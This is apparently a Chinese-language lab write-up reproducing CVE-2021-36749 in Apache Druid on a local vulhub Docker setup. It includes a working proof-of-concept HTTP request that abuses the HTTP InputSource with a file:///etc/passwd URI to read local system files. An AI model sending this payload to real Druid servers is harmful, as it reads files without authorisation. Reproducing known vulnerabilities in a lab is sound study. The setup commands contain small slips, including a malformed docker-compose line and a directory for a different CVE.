## CVE-2021-36749

> ID:bx33661



[TOC]

### 介绍

> In the Druid ingestion system, the InputSource is used for reading data from a certain data source. However, the HTTP InputSource allows authenticated users to read data from other sources than intended, such as the local file system, with the privileges of the Druid server process. This is not an elevation of privilege when users access Druid directly, since Druid also provides the Local InputSource, which allows the same level of access. But it is problematic when users interact with Druid indirectly through an application that allows users to specify the HTTP InputSource, but not the Local InputSource. In this case, users could bypass the application-level restriction by passing a file URL to the HTTP InputSource. This issue was previously mentioned as being fixed in 0.21.0 as per CVE-2021-26920 but was not fixed in 0.21.0 or 0.21.1.
>
> ------
>
> 在Druid摄取系统中，InputSource用于从某个数据源读取数据。但是，HTTP InputSource允许经过身份验证的用户以Druid服务器进程的权限从预期以外的其他来源 (例如本地文件系统) 读取数据。当用户直接访问Druid时，这不是特权提升，因为Druid还提供本地InputSource，它允许相同级别的访问。但是，当用户通过允许用户指定HTTP InputSource而不是本地InputSource的应用程序间接与Druid交互时，这是有问题的。在这种情况下，用户可以通过将文件URL传递给HTTP InputSource来绕过应用程序级别的限制。此问题以前提到过，根据CVE-2021-26920在0.21.0中修复，但在0.21.0或0.21.1中未修复。



### 环境复现

需要本地安装docker环境和git环境

> 这里选择复现平台：https://github.com/vulhub/vulhub
>
> ![Vulhub](https://github.com/vulhub/vulhub/raw/master/.github/assets/banner.png)

```
git clone https://github.com/vulhub/vulhub.git
cd apache-druid
cd CVE-2021-25646
docker docker-compose up -d
```

![](https://gitee.com/bx33661/image/raw/master/path/image-20241015222003313.png)



### POC

进入容器：我这里IP是：`http://localhost:8888/`,进入了**druid**

![image-20241015223158685](https://gitee.com/bx33661/image/raw/master/path/image-20241015223158685.png)

点击*Load data* ，选择*HTTP(s)*

![image-20241015223343033](https://gitee.com/bx33661/image/raw/master/path/image-20241015223343033.png)

执行如下参数，验证文件读取：

- Source type : `http`
- URIs : `file:///etc/passwd`

![image-20241015222927290](https://gitee.com/bx33661/image/raw/master/path/image-20241015222927290.png)

这里是用`Yakit` 抓包

![image-20241015222841981](https://gitee.com/bx33661/image/raw/master/path/image-20241015222841981.png)

表内容为：

```http
POST /druid/indexer/v1/sampler?for=connect HTTP/1.1
Host: localhost:8888
sec-ch-ua: "Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"
Content-Type: application/json;charset=UTF-8
Accept-Language: zh-CN,zh;q=0.9
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
sec-ch-ua-platform: "Windows"
Accept-Encoding: gzip, deflate, br, zstd
sec-ch-ua-mobile: ?0
Sec-Fetch-Site: same-origin
Referer: http://localhost:8888/unified-console.html
Sec-Fetch-Dest: empty
Accept: application/json, text/plain, */*
Origin: http://localhost:8888
Sec-Fetch-Mode: cors
Content-Length: 423

{"type":"index","spec":{"type":"index","ioConfig":{"type":"index","inputSource":{"type":"http","uris":["file:///etc/passwd"]},"inputFormat":{"type":"regex","pattern":"(.*)","columns":["raw"]}},"dataSchema":{"dataSource":"sample","timestampSpec":{"column":"!!!_no_such_column_!!!","missingValue":"1970-01-01T00:00:00Z"},"dimensionsSpec":{}},"tuningConfig":{"type":"index"}},"samplerConfig":{"numRows":500,"timeoutMs":15000}}
```

执行入口在 ： `"uris":["file:///etc/passwd"]}`



### 参考文档

- https://xz.aliyun.com/t/12555?time__1311=GqGxuiD%3DGQKmqGN4eeqBIc06ovpuAbD#toc-6
- https://nvd.nist.gov/vuln/detail/CVE-2021-36749